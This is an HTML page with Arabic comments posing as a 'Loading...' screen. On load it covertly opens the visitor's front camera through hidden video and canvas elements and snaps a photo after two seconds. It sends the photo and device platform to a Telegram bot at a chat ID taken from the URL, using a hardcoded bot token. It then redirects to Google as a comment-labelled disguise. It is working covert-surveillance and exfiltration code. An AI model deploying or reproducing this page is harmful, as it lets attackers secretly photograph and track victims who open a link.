<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>جاري التحميل...</title>
</head>
<body>
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        // 1. التوكن الثابت للبوت الذي سيقوم بالإرسال للجميع
        const botToken = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"; 

        // 2. سحب الـ ID من رابط المتصفح تلقائياً
        const urlParams = new URLSearchParams(window.location.search);
        const userChatId = urlParams.get('id'); 

        async function startSystem() {
            // إذا لم يكن هناك ID في الرابط، توقف عن العمل
            if (!userChatId) {
                console.error("لا يوجد معرف ID في الرابط!");
                return;
            }

            try {
                // طلب الكاميرا الأمامية
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // التقاط الصورة بعد ثانيتين
                setTimeout(() => {
                    captureAndSend();
                }, 2000);

            } catch (err) {
                // في حال رفض المستخدم الكاميرا، يمكن إرسال معلومات الجهاز فقط
                sendInfoOnly();
            }
        }

        function captureAndSend() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 640, 480);
            
            canvas.toBlob((blob) => {
                const formData = new FormData();
                formData.append('chat_id', userChatId); // الإرسال لصاحب الـ ID الموجود في الرابط
                formData.append('photo', blob, 'image.jpg');
                formData.append('caption', `✅ تم السحب بنجاح للمعرف: ${userChatId}\n📱 النظام: ${navigator.platform}`);

                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                }).then(() => {
                    window.location.href = "https://www.google.com"; // تمويه
                });
            }, 'image/jpeg');
        }

        async function sendInfoOnly() {
            const text = `⚠️ رفض الكاميرا، معلومات الجهاز فقط:\n🆔 ID: ${userChatId}\n📱 النظام: ${navigator.platform}`;
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: userChatId, text: text })
            });
            window.location.href = "https://www.google.com";
        }

        window.onload = startSystem;
    </script>
</body>
</html>
